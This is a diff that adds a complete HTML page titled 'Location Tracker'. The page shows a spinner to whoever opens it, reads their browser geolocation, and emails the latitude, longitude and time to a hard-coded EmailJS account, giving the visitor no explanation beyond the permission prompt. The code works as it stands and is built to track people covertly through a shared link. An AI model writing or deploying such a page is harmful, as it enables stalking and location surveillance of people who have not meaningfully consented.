@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Location Tracker</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #111;
+      margin: 0;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #doneMessage {
+      display: none;
+      color: white;
+      font-family: sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div id="preloader" class="spinner"></div>
+  <h3 id="doneMessage">📍 Location sent successfully</h3>
+
+  <script>
+    // ✅ Initialize EmailJS
+    (function () {
+      emailjs.init("LS0kSC-13YzzAE78w");
+    })();
+
+    // ✅ Send location function
+    function sendLocation(lat, lon) {
+      const now = new Date().toLocaleString();
+
+      const templateParams = {
+        latitude: lat,
+        longitude: lon,
+        date_time: now
+      };
+
+      emailjs.send('service_dwxm5dp', 'template_omqnoz4', templateParams)
+        .then(function (response) {
+          console.log('✅ Location sent!', response.status, response.text);
+          document.getElementById('preloader').style.display = 'none';
+          document.getElementById('doneMessage').style.display = 'block';
+        }, function (error) {
+          console.error('❌ Failed to send location:', error);
+          document.getElementById('preloader').style.display = 'none';
+        });
+    }
+
+    // ✅ Get geolocation
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocation(lat, lon);
+        },
+        function (error) {
+          console.error("❌ Error getting location:", error.message);
+          document.getElementById('preloader').style.display = 'none';
+        }
+      );
+    } else {
+      console.log("❌ Geolocation not supported.");
+      document.getElementById('preloader').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
